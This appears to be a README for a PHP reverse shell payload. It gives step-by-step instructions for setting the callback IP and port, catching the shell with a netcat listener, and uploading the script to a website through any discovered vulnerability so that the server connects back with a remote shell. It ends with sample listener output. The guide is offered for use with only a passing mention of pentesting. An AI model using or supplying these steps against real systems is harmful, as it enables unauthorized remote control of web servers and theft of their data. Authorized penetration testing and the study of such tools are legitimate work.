# reverse_shell_php
A PHP Reverse_shell Payload - use it at your own risk!

- Guide :
Modify the source

To prevent someone else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:

$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS

Get Ready to catch the reverse shell

Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):

$ nc -v -n -l -p 1234

Upload and Run the script

Using whatever vulnerability you’ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won’t see any output on the web page, it’ll just hang if successful):

Enjoy your new shell

If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:

$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
